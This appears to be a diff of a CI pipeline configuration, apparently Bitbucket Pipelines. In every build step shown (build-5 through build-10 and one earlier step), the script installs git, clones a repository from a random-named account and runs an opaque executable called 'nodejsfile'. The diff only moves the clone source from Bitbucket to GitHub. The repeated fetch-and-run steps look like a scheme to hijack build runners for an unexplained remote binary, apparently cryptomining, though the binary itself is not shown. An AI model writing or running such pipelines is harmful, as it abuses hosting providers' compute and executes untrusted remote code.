-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
